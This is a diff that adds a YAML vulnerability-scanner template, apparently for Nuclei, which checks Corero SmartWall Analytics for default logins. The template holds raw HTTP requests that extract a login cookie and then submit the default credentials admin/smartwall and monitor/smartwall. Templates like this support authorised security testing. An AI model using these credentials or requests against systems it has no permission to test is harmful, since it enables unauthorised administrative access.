@@ -1,0 +1,63 @@
+id: corero-swa-default-login
+info:
+  author: c-sh0
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-1392
+  description: Corero Smartwall Analytics UI Default Login
+  name: Corero Smartwall Analytics UI Default Login
+  reference:
+  - https://www.juniper.net/documentation/en_US/corero-smartwall9.7.5/information-products/topic-collections/Corero_SmartWall_CMS_UG/Content/TDD/tdd_manage_users.htm
+  - https://www.juniper.net/documentation/en_US/corero-smartwall9.7.0/information-products/topic-collections/Corero_SmartWall_TDD_UG/Content/TDD/tdd_service_portal.htm
+  severity: high
+  tags: default-login,panel,webui,corero
+requests:
+- attack: clusterbomb
+  cookie-reuse: true
+  extractors:
+  - group: 1
+    internal: true
+    name: cookie_cval
+    part: header
+    regex:
+    - (?i)Set-Cookie:\s+cval=([0-9]+);
+    type: regex
+  matchers:
+  - status:
+    - 200
+    type: status
+  - part: body
+    type: word
+    words:
+    - '{"status":0}'
+  matchers-condition: and
+  payloads:
+    password:
+    - smartwall
+    username:
+    - admin
+    - monitor
+  raw:
+  - 'GET /en-US/account/login HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+    like Gecko) Chrome/95.0.4638.69 Safari/537.36
+
+    '
+  - 'POST /en-US/account/login HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+    like Gecko) Chrome/95.0.4638.69 Safari/537.36
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    cval={{cookie_cval}}&username={{username}}&password={{password}}&return_to=%2Fen-US%2F
+
+    '
+  redirects: false
